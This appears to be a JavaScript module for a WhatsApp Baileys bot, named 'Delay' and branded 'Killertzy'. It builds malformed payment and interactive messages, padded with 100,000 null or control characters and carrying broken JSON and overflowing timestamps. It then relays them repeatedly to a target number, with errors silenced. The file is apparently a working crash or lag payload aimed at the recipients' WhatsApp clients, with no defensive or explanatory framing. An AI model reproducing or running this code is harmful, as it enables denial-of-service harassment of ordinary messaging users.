/**
 * Modular Kernel: Delay
 */
export const version = "1.0.0";
export const hash = "SIG_DELAY_INTERNAL";

export async function delay(sock, jid) {
  const fakeJid = "120363422445860082@g.us";

  let msg4 = {
    stanzaId: sock.generateMessageTag(),
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: 999e+999 * Date.now()
      }
    },
    businessMessageForwardInfo: {
      businessOwnerJid: "0@s.whatsapp.net"
    },
    nativeFlowMessage: {
      messageParamsJson: "{",
      buttons: [
        {
          name: "review_and_pay",
          buttonParamsJson: JSON.stringify({
            currency: "USD",
            payment_configuration: "",
            payment_type: "",
            total_amount: { value: 999999999, offset: 100 },
            reference_id: "4SWMDTS1PY4",
            type: "physical-goods",
            order: {
              status: "payment_requested",
              description: "",
              subtotal: { value: 0, offset: 100 },
              order_type: "PAYMENT_REQUEST",
              items: [
                {
                  retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                  name: "X",
                  amount: { value: 999999999, offset: 100 },
                  quantity: 1
                }
              ]
            },
            additional_note: ` + ${"\u0000".repeat(10000)} + `,
            native_payment_methods: [],
            share_payment_status: true
          })
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMessage: {
            message: "─┃► #Killertzy - Explore# 🩸"
          }
        },
        location: {
          degreesLongitude: 0,
          degreesLatitude: 0,
          name: "──+."
        },
        polygonVertices: [
          { x: 60.71664810180664, y: -36.39784622192383 },
          { x: -16.710189819335938, y: 49.263675689697266 },
          { x: -56.585853576660156, y: 37.85963439941406 },
          { x: 20.840980529785156, y: -47.80188751220703 }
        ],
        newsletter: {
          newsletterJid: "1@newsletter",
          newsletterName: "──all.",
          contentType: "UPDATE",
          accessibilityText: "https://KillerTzy/"
        }
      }
    ]
  };

  let msg1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: fakeJid,
            mentionedJid: [jid],
            isForwarded: true,
            fromMe: false,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363422445860082@newsletter",
              serverMessageId: 1,
              newsletterName: "┃► #Killertzy - Explore# 🩸"
            }
          },
          body: {
            text: "┃► #Killertzy - Explore# 🩸",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(100000), 
            version: 3
          }
        }
      }
    }
  };

  const { generateWAMessageFromContent } = await import("@rexxhayanasi/elaina-baileys");
  const prep1 = await generateWAMessageFromContent(jid, msg1, {});
  const prep4 = await generateWAMessageFromContent(jid, msg4, {});

  let msg2 = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "SYSTEM_RECALIBRATION",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: JSON.stringify({
                values: {
                  in_pin_code: "7205",
                  building_name: "void_motel",
                  address: "2.7205",
                  tower_number: "507",
                  city: "Batavia",
                  name: "Otax?",
                  phone_number: "+13135550202",
                  house_number: "7205826",
                  floor_number: "16",
                  state: "\x10".repeat(100000)
                }
              }),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  let msg3 = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "┃► #Killertzy - Explore# 🩸 impossible ",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({
                flow_cta: "\u0000".repeat(100000),
                flow_message_version: "3"
              }),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  const messages = [prep1, msg2, msg3, prep4];

  for (let kil = 0; kil < 2; kil++) {
    for (const msg of messages) {
      try {
        await sock.relayMessage(
            jid,
            msg.message,
            { messageId: msg.key.id }
        );
      } catch (e) { }
    }
  }
}
